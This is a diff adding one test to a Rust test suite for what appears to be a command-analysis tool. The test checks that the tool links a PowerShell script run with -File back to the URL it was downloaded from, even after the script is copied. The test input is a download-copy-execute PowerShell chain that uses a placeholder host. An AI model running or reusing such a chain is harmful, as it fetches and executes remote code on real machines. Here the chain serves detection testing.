@@ -18338,6 +18338,28 @@ mod powershell_tests {
     }
 
     #[test]
+    fn powershell_get_content_set_content_copy_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-copy-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "Get-Content '%TEMP%\downloaded.ps1' | Set-Content '%TEMP%\copied.ps1'"
+powershell -NoProfile -File "%TEMP%\copied.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("copied.ps1")
+                        && url == "https://ps-copy-provenance.example/stage.ps1"
+            )),
+            "PowerShell copied script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_file_current_dir_nested_tracks_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 =
